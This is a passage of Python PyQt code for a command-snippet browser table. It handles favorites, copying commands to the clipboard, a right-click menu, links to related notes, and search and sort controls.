        cmd=self._cmd_preview(n);compact=self._compact_cmd(cmd)
        cmd_item=QTableWidgetItem(compact);cmd_item.setToolTip(cmd);cmd_item.setTextAlignment(Qt.AlignmentFlag.AlignVCenter|Qt.AlignmentFlag.AlignLeft)
        self.table.setItem(r,0,fav);self.table.setItem(r,1,cat_item);self.table.setItem(r,2,sub_item);self.table.setItem(r,3,cmd_item)
        self.table.setRowHeight(r,60)
    def _row_item(self,row):
        it=self.table.item(row,1)
        if not it:return None
        d=it.data(Qt.ItemDataRole.UserRole)
        return d if isinstance(d,dict) else None
    def _copy(self,n,raw=False):
        if not n:return
        cmd=n.get("command","") if raw else self._cmd_preview(n)
        try:
            QApplication.clipboard().setText(cmd or "")
            _log("[+]",f"Copied snippet: {n.get('title','')}")
        except Exception as e:_log("[!]",f"Clipboard error ({e})")
    def _nav_notes(self):
        try:w=self.window()
        except Exception:return None
        if w and hasattr(w,"on_nav"):
            try:w.on_nav("notes")
            except Exception:pass
        return getattr(w,"page_notes",None) if w else None
    def _related_note_ref(self,n):
        if not isinstance(n,dict):return None
        try:return _note_refs.resolve_note_ref(_db_path(),note_id=n.get("note_id"),note_name=n.get("note_name",""))
        except Exception:return None
    def _has_related_note(self,n):
        return bool(_command_related.related_notes(_db_path(),n))
    def _open_related_note(self,n):
        if not isinstance(n,dict):return False
        return _command_related.open_related_notes(self,n,_db_path(),self._nav_notes)
    def _toggle_favorite(self,n):
        if not n:return
        k=self._fav_key(n)
        if k in self._favorites:self._favorites.remove(k)
        else:self._favorites.add(k)
        self._save_favorites();self._apply()
    def _on_cell_click(self,row,col):
        n=self._row_item(row)
        if not n:return
        if col==0:self._toggle_favorite(n);return
        self._copy(n,raw=False)
    def _on_cell_double(self,row,col):
        self._copy(self._row_item(row),raw=False)
    def _ctx_menu(self,pos:QPoint):
        ix=self.table.indexAt(pos)
        if not ix.isValid():return
        row=ix.row();self.table.selectRow(row);n=self._row_item(row)
        if not n:return
        fav_label="Remove Favorite" if self._fav_key(n) in self._favorites else "Add Favorite"
        menu=QMenu(self)
        show_note=QAction("Show in Note",self);show_note.setEnabled(self._has_related_note(n));show_note.triggered.connect(lambda:self._on_show_in_note(n))
        a1=QAction("Copy Command",self);a1.triggered.connect(lambda:self._copy(n,raw=False))
        a2=QAction("Copy Raw Command",self);a2.triggered.connect(lambda:self._copy(n,raw=True))
        a3=QAction(fav_label,self);a3.triggered.connect(lambda:self._toggle_favorite(n))
        a4=QAction("Copy Title",self);a4.triggered.connect(lambda:QApplication.clipboard().setText(n.get("title","") or ""))
        menu.addAction(show_note);menu.addSeparator();menu.addAction(a1);menu.addAction(a2);menu.addSeparator();menu.addAction(a3);menu.addSeparator();menu.addAction(a4)
        menu.exec(self.table.viewport().mapToGlobal(pos))
    def _on_show_in_note(self,n):
        res=self._open_related_note(n)
        if res is None or res:return
        QMessageBox.information(self,"Show in Note","Related note not found.")
    def _prev_page(self):
        pass
    def _next_page(self):
        pass
    def _on_per_page(self,t):
        try:self._per=max(1,int(t))
        except:self._per=10
        self._page=1;self._render()
    def _on_search(self,t):
        self._apply()
    def _set_sort_mode(self,mode):
        self._sort_mode=mode or "A -> Z";self._apply()
    def _on_favorites(self,checked):
        self._favorites_only=bool(checked);self._save_favorites_only();self._apply()
